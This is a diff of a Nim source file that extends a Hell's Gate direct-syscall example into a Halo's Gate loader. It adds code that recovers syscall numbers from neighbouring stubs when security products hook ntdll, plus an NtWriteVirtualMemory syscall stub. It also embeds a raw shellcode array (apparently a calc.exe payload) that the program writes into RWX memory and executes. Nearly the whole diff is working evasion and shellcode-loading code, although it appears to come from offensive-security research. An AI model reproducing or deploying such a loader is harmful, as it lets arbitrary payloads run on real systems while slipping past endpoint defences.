@@ -1,3 +1,9 @@
+#[
+    Original author: ZimaWhit3, https://github.com/zimawhit3
+    Modified by: pruno, Twitter: @pruno7
+    License: BSD 3-Clause
+]#
+
 include custom
 import strutils
 import os
@@ -15,7 +21,7 @@ type
 
 proc djb2_hash*(pFuncName : string) : uint64 =
 
-    var hash : uint64 = 0x5381
+    var hash : uint64 = 0x5382
 
     for c in pFuncName:
         hash = ((hash shl 0x05) + hash) + cast[uint64](ord(c))
@@ -50,6 +56,8 @@ proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_
     var 
         cx : DWORD = 0
         numFuncs : DWORD = pCurrentExportDirectory.NumberOfNames
+        DOWN = 32
+        UP = -32
     let 
         pAddrOfFunctions    : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfFunctions)
         pAddrOfNames        : ptr UncheckedArray[DWORD] = cast[ptr UncheckedArray[DWORD]](cast[ByteAddress](pImageBase) + pCurrentExportDirectory.AddressOfNames)
@@ -66,10 +74,22 @@ proc getTableEntry*(pImageBase : PVOID, pCurrentExportDirectory : PIMAGE_EXPORT_
         if funcHash == tableEntry.dwHash:
 
             tableEntry.pAddress = pFuncAddr
+            # Not hooked
             if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3)[] == 0xB8:
                 tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4)[]
+                return true
+            # Classic hook
+            elif cast[PBYTE](cast[ByteAddress](pFuncAddr))[] == 0xE9:
+                for idx in countup(1,500):
+                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * UP)[] == 0xB8:
+                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * UP))[] + cast[WORD](idx)
+                        return true
+                    if cast[PBYTE](cast[ByteAddress](pFuncAddr) + 3 + idx * DOWN)[] == 0xB8:
+                        tableEntry.wSysCall = cast[PWORD](cast[ByteAddress](pFuncAddr) + 4 + (idx * DOWN))[] - cast[WORD](idx)
+                        return true 
+            # Todo : Tartarus gate
 
-            return true
+            #return true
         inc cx
     return false
 
@@ -131,14 +151,41 @@ proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: var PVOID, Zero
         ret
     """
 
-
-
+proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.asmNoStackFrame.} =
+    asm """
+        mov r10, rcx
+        mov eax, `syscall`
+        syscall
+        ret
+    """
 
 when isMainModule:
     
     when defined(amd64):
-        echo fmt"[i] Hell's Gate - A quick Nim implementation example"
+        echo fmt"[i] Halo's Gate - A quick Nim implementation example, based on https://github.com/zimawhit3/HellsGateNim"
         
+        var shellcode: array[287, byte] = [
+        byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
+        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
+        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
+        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
+        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
+        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
+        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
+        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
+        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
+        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
+        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
+        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
+        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
+        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
+        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,
+        0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,
+        0x65,0x00]
+
         if paramCount() != 0:
             echo fmt"[!] Usage: .\Hellsgate.exe"
         else:
@@ -147,7 +194,9 @@ when isMainModule:
                 example         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : funcHash)
                 status          : NTSTATUS          = 0x00000000
                 buffer          : LPVOID            = NULL
-                dataSz          : SIZE_T            = sizeof(0x1000)      
+                # dataSz          : SIZE_T            = sizeof(0x1000)
+                dataSz          : SIZE_T            = cast[SIZE_T](shellcode.len)
+
             if getSyscall(example):
                 
                 echo fmt"[+] NtAllocateVirtualMemory"
@@ -159,12 +208,38 @@ when isMainModule:
 
                 
                 syscall = example.wSysCall
-                status = NtAllocateVirtualMemory(cast[HANDLE](-1), buffer, 0, &dataSz, MEM_COMMIT, PAGE_READWRITE)
+                status = NtAllocateVirtualMemory(cast[HANDLE](-1), buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
                 
                 echo fmt"[i] Status: 0x{toHex(status)}"
                 if not NT_SUCCESS(status):
                     echo fmt"[-] Failed to allocate memory."
                 else:
-                    echo fmt"[+] Allocated a page of memory with RW perms at 0x{toHex(cast[ByteAddress](buffer))}"
+                    echo fmt"[+] Allocated a page of memory with RWX perms at 0x{toHex(cast[ByteAddress](buffer))}"
             else:
                 echo fmt"[-] Failed to find opcode for NtAllocateVirtualMemory"
+
+            funcHash = djb2_hash("NtWriteVirtualMemory")
+            example = HG_TABLE_ENTRY(dwHash : funcHash)
+            if getSyscall(example):
+                
+                echo fmt"[+] NtWriteVirtualMemory"
+                echo fmt"    Opcode  : {toHex(example.wSyscall)}"
+                echo fmt"    Address : 0x{toHex(cast[ByteAddress](example.pAddress))}"
+                echo fmt"    Hash    : {toHex(example.dwHash)}"
+
+                echo fmt"[+] Calling NtWriteVirtualMemory"
+
+                var bytesWritten: SIZE_T
+                syscall = example.wSysCall
+                status = NtWriteVirtualMemory(cast[HANDLE](-1), buffer, unsafeAddr shellcode, dataSz, addr bytesWritten)
+                
+                echo fmt"[i] Status: 0x{toHex(status)}"
+                if not NT_SUCCESS(status):
+                    echo fmt"[-] Failed to allocate memory."
+                else:
+                    echo fmt"[+] Wrote bytes at 0x{toHex(cast[ByteAddress](buffer))}"
+            else:
+                echo fmt"[-] Failed to find opcode for NtWriteVirtualMemory"
+
+            let a = cast[proc(){.nimcall.}](buffer)
+            a()    
